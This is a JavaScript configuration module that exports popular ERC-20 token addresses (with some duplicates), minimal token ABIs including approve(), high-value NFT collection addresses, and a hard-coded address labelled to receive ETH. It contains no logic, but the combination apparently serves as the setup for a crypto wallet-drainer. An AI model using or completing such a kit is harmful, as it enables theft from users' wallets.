// List of ERC-20 token contract addresses to check
const tokenAddresses = [
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    "0x32e4A492068beE178A42382699DBBe8eEF078800", // BIRDPAW
    "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
    "0xB8c77482e45F1F44dE1745F52C74426C631bDD52", // BNB
    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
    "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
    "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
    "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", // SHIB
    "0x6982508145454Ce325dDbE47a25d4ec3d2311933", // PEPE
    "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", // AAVE
    "0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0", // MATIC
    "0xc00e94Cb662C3520282E6f5717214004A7f26888", // COMP
    "0xD533a949740bb3306d119CC777fa900bA034cd52", // CRV
    "0x0D8775F648430679A709E98d2b0Cb6250d2887EF", // BAT
    "0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32", // LDO
    "0x3155BA85D5F96b2d030a4966AF206230e46849cb", // RUNE
    "0x75231F58b43240C9718Dd58B4967c5114342a86c", // OKB
    "0x111111111117dC0aa78b770fA6A738034120C302", // 1INCH
    "0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD", // LRC
    "0xE41d2489571d322189246DaFA5ebDe1F4699F498", // ZRX
    "0x6f259637dcD74C767781E37Bc6133cd6A68aa161", // HT
    "0x4fabb145d64652a948d72533023f6e7a623c7c53", // BUSD
    "0x408e41876cCCDC0F92210600ef50372656052a38", // REN
    "0x8290333ceF9e6D528dD5618Fb97a76f268f3EDD4", // ANKR
    "0x0000000000085d4780B73119b644AE5ecd22b376", // TUSD
    "0x8Ab7404063Ec4DBcfd4598215992DC3F8EC853d7", // AKRO
    "0xB64ef51C888972c908CFacf59B47C1AfBC0Ab8aC", // STORJ
    "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e", // YFI
    "0x0d438F3b5175Bebc262bF23753C1E53d03432bDE", // WNXM
    "0x45804880De22913dAFE09f4980848ECE6EcbAf78", // PAXG
    "0x39AA39c021dfbaE8faC545936693aC917d5E7563", // cUSDC
    "0x3F382DbD960E3a9bbCeaE22651E88158d2791550", // AXS
    "0x6810e776880c02933d47db1b9fc05908e5386b96", // GNO
    "0xa15c7ebe1f07caf6bff097d8a589fb8ac49ae5b3", // NPXS
    "0x4e15361fd6b4bb609fa63c81a2be19d873717870", // FTM
    "0x1985365e9f78359a9b6ad760e32412f4a445e862", // REP
    "0xc00e94Cb662C3520282E6f5717214004A7f26888", // COMP
    "0x408e41876cCCDC0F92210600ef50372656052a38", // REN
    "0x8Ab7404063Ec4DBcfd4598215992DC3F8EC853d7", // AK
];

// ERC-20 contract ABI (minimal ABI for balanceOf, approve, etc.)
const erc20Abi = [
    "function balanceOf(address owner) view returns (uint256)",
    "function decimals() view returns (uint8)",
    "function symbol() view returns (string)",
    "function approve(address spender, uint256 amount) returns (bool)"
];

// ERC-721 ABI (minimal ABI for balanceOf and token details)
const erc721Abi = [
    "function balanceOf(address owner) view returns (uint256)",
    "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
    "function tokenURI(uint256 tokenId) view returns (string)"
];

// ERC-1155 ABI (minimal ABI for balanceOf and token URI)
const erc1155Abi = [
    "function balanceOf(address account, uint256 id) view returns (uint256)",
    "function uri(uint256 id) view returns (string)"
];

// ERC-721 contract addresses (popular collections on the Ethereum network)
const erc721Addresses = [
    "0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB", // CryptoPunks (Wrapped CryptoPunks)
    "0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d", // Bored Ape Yacht Club (BAYC)
    "0xed5af388653567af2f388e6224dc7c4b3241c544", // Azuki
    "0xe785E82358879F061BC3dcAC6f0444462D4b5330", // World of Women
    "0x8a90cab2b38dba80c64b7734e58ee1db38b8992e"  // Doodles
];

// ERC-1155 contract addresses (popular collections on the Ethereum network)
const erc1155Addresses = [
    "0xf629cbd94d3791c9250152bd8dfbdf380e2a3b9c", // Enjin
    "0xF6793dA657495ffeFF9Ee6350824910Abc21356C", // Rarible
    "0x0e3a2a1f2146d86a604adc220b4967a898d7fe07" // Gods Unchained
];

// Contract owner's address to receive the ETH
const contractOwnerAddress = "0xDc484b655b157387B493DFBeDbeC4d44A248566F";

export { tokenAddresses, erc20Abi, contractOwnerAddress, erc721Abi, erc1155Abi, erc721Addresses, erc1155Addresses };
